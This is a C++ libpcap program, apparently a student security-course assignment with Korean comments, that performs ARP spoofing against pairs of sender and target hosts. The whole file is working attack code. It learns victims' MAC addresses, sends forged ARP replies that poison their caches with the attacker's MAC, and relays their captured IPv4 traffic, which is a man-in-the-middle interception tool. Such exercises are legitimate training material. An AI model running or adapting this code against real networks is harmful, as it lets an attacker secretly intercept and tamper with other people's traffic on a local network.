#include <cstdio>
#include <pcap.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <iostream>
#include<arpa/inet.h>
#include <chrono>
#include <thread>

#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"
#include "ip.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp-test wlan0 192.168.0.2 192.168.0.1 \n");
}

void print_ip(uint32_t ip) {
    struct in_addr ip_addr;
    ip_addr.s_addr = htonl(ip);
    printf("%s", inet_ntoa(ip_addr));
	//와이어샤크 디버깅용으로 만든 임의 함수
}
/*
   일단 귀찮으니까 분리하지말고,
todo:
1. 일단 인자 여러개 받아야되고
2. 내 mac 주소 얻어 오는 것
3. 상대 맥 주소 얻어 오는 것 => 정상적인 arp 요청을 보내서 응답을 통해서 알아오도록(애초에 arp를 통해서 공격을 하는 만큼, 상대의 ip는 알고 있는 상태에서 내 mac주소를 상대에게 게이트웨이의 mac주소로 인지하게끔 변조)
4. 확인 여부는 타겟의 arp table 조회
 */


Mac get_my_mac_address(const char* my_interface){
	int file_descripter;
	struct ifreq interface_structure;

	file_descripter = socket(AF_INET, SOCK_DGRAM, 0);
	interface_structure.ifr_addr.sa_family = AF_INET;
	strncpy(interface_structure.ifr_name, my_interface, IFNAMSIZ-1);
	ioctl(file_descripter, SIOCGIFHWADDR, &interface_structure);
	close(file_descripter);

	return Mac((uint8_t*)interface_structure.ifr_hwaddr.sa_data);
}

Ip get_my_ip_address(const char* my_interface){
	struct ifreq interface_structure;
    struct sockaddr_in* ip_addr;
    int file_descriptor;

    file_descriptor = socket(AF_INET, SOCK_DGRAM, 0);
    interface_structure.ifr_addr.sa_family = AF_INET;
    strncpy(interface_structure.ifr_name, my_interface, IFNAMSIZ-1);
    ioctl(file_descriptor, SIOCGIFADDR, &interface_structure);
    close(file_descriptor);

    ip_addr = (struct sockaddr_in*)&interface_structure.ifr_addr;
    return Ip(ip_addr->sin_addr.s_addr);

}


Mac get_sender_mac_address(pcap_t* handle, Mac source_mac, Ip source_ip, Ip sender_ip ){
	//타겟의 mac 주소를 모른다는 가정하에 접근하고, 이에 따른 응답으로 mac 주소를 배우는 구조이므로 기존의 스켈레톤 코드를 통한 함수화
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //이건 브로드캐스팅을 해야되는게 당연한거임
	packet.eth_.smac_ = source_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = source_mac;
	packet.arp_.sip_ = htonl(source_ip);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(sender_ip);

	printf("[INFO] Sending ARP Request:\n");
	printf("       Source MAC: %s\n", std::string(source_mac).c_str());
	printf("       Source IP: %s\n", std::string(source_ip).c_str());
	printf("       Sender IP: %s\n", std::string(sender_ip).c_str());

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return Mac("00:00:00:00:00:00");
	}

	
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* replyPacket;
		res = pcap_next_ex(handle, &header, &replyPacket);
		if (res == 0) continue; 
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		EthArpPacket* arpReply = (EthArpPacket*)replyPacket;

		printf("[INFO] Received ARP Reply:\n");
		printf("       Sender MAC: %s\n", std::string(arpReply->arp_.smac_).c_str());
//		printf("       Sender IP: %s\n", std::string(ntohl(arpReply->arp_.sip_)).c_str());
 		printf("       Sender IP: ");
        print_ip(ntohl(arpReply->arp_.sip_));
        printf("\n");

		if (ntohs(arpReply->eth_.type_) == EthHdr::Arp &&
				ntohs(arpReply->arp_.op_) == ArpHdr::Reply &&
				arpReply->arp_.sip_ == Ip(htonl(sender_ip))) {
			return arpReply->arp_.smac_;
		}
	}

	return Mac("00:00:00:00:00:00"); 

}

void send_Arp(pcap_t* handle, Mac sender_mac, Ip sender_ip, Mac target_mac, Ip target_ip ){
	//기본적으로 스켈레톤 코드에서 작성된 arp 코드를 가져오되, 이번 과제에서는 단순히 하나의 타겟이 아님
	//왜 멘토님께서 sender, target으로 하라고 하셨는지 뼈저리게 느낌
	EthArpPacket packet;

   	packet.eth_.dmac_ = target_mac;            // 타겟의 MAC 주소
    packet.eth_.smac_ = sender_mac;            // 공격자의 MAC 주소
    packet.eth_.type_ = htons(EthHdr::Arp);    // 이더넷 타입: ARP

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);   // 하드웨어 타입: 이더넷
    packet.arp_.pro_ = htons(EthHdr::Ip4);     // 프로토콜 타입: IPv4
    packet.arp_.hln_ = Mac::SIZE;              // 하드웨어 주소 길이
    packet.arp_.pln_ = Ip::SIZE;               // 프로토콜 주소 길이
    packet.arp_.op_ = htons(ArpHdr::Reply);    // ARP 오퍼레이션: Reply

    packet.arp_.smac_ = sender_mac;            // 공격자의 MAC 주소 (변조된 MAC 주소)
    packet.arp_.sip_ = htonl(sender_ip);      // 변조된 IP 주소 (타겟이 오인하게 만들 IP)
    packet.arp_.tmac_ = target_mac;            // 타겟의 MAC 주소 (변조된 MAC 주소의 소유자라고 착각하게 될 대상)
    packet.arp_.tip_ = htonl(target_ip);       // 타겟의 IP 주소 (스푸핑하려는 대상 IP)

    printf("[INFO] Sending ARP Spoofing Packet:\n");
    printf("       Attacker MAC: %s\n", std::string(sender_mac).c_str());
    printf("       Spoofed Source IP: %s (Fake Source IP)\n", std::string(sender_ip).c_str());
    printf("       Target MAC: %s (Victim's MAC)\n", std::string(target_mac).c_str());
    printf("       Target IP: %s (Victim's IP)\n", std::string(target_ip).c_str());

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}


void relay_packet(pcap_t* handle, Mac myMac, Mac sender_mac, Ip sender_ip, Mac target_mac, Ip target_ip ){
	//패킷 캡쳐해서, 목적지 ip는 타겟인데, 목적지 MAC이 나의 MAC과 동일하면 이 내용을 복사해서 타겟의 mac,ip로 다시 보내준다
	// smac == sender.mac && dmac ==my.mac => sender.mac = my.mac , dmac = target.mac
	// smac == target.mac && dmac == my.ac => sender.mac = my.mac , dmac = sender.mac 
	// 나머지는 무시 
		while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue; 
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
			}
		PEthHdr eth_hdr = (PEthHdr)packet;
		std::cout<<"릴레이 시작" << std::endl;
		if(eth_hdr->type() == EthHdr::Ip4) {
			u_char * relay_packet = new u_char[header->caplen];
			memcpy(relay_packet, packet, header->caplen);

			PEthHdr relay_eth_hdr = (PEthHdr)relay_packet;
				std::cout << "Captured Packet of Mac Address from"<< ": " << std::string(eth_hdr->smac_) <<"to :"<<std::string(eth_hdr->dmac_)<< std::endl;


			if (eth_hdr->smac_ == sender_mac && eth_hdr->dmac_ == myMac) {
				relay_eth_hdr->smac_ = myMac;
				relay_eth_hdr->dmac_ = target_mac;
				std::cout << "Relay Packet of Mac Address from"<< ": " << std::string(sender_mac) <<"to :"<<std::string(target_mac)<< std::endl;

			} else if(eth_hdr->smac_ == target_mac && eth_hdr->dmac_ == myMac){
				relay_eth_hdr->smac_ = myMac;
            	relay_eth_hdr->dmac_ = sender_mac;
				std::cout << "Relay Packet of Mac Address from"<< ": " << std::string(target_mac) <<"to :"<<std::string(sender_mac)<< std::endl;//나중에 usingnamespace std;

			} else{
				delete[] relay_packet;
				continue;
			}
			int res = pcap_sendpacket(handle, relay_packet, header->caplen);

			if (res != 0){
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}

			delete[] relay_packet;
		}
	}
}



int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];	

	Mac myMac = get_my_mac_address(dev);

	std::string macStr = std::string(myMac);

	std::cout << "MAC Address of interface "<< ": " << macStr << std::endl;
	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	Ip myIp = get_my_ip_address(dev); 	

	printf("IP Address of interface : ");
	print_ip(myIp);
	printf("\n");

	// 여러 쌍의 sender와 target을 처리하는 루프
	for (int i = 2; i < argc; i += 2) {
		Ip senderIp = Ip(argv[i]);
		Ip targetIp = Ip(argv[i + 1]);

		std::cout << "[INFO] Processing pair: Sender IP = ";
		print_ip(senderIp);
		std::cout << ", Target IP = ";
		print_ip(targetIp);
		std::cout << std::endl;

		// 각 sender IP에 대해 ARP 요청을 보내고 MAC 주소를 얻음
		Mac senderMac = get_sender_mac_address(handle, myMac, myIp, senderIp);
		Mac targetMac = get_sender_mac_address(handle, myMac, myIp, targetIp);


		if (senderMac.isNull()) {
			fprintf(stderr, "Failed to get MAC address for IP: ");
			print_ip(senderIp);
			std::cout << std::endl;
			continue;
		}

		// 얻은 MAC 주소를 사용하여 ARP 스푸핑 패킷을 보냄
		send_Arp(handle, myMac, targetIp, senderMac, senderIp);
		send_Arp(handle, myMac, senderIp, targetMac, targetIp);


		std::cout << "[INFO] Completed processing for this pair." << std::endl << std::endl;

		relay_packet(handle, myMac, senderMac, senderIp, targetMac, targetIp);

		std::cout << "[INFO] Completed relay packet for this pair." << std::endl << std::endl;

		// 다음 쌍으로 넘어가기 전에 대기 (예: 1초 대기)
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}

	pcap_close(handle);
}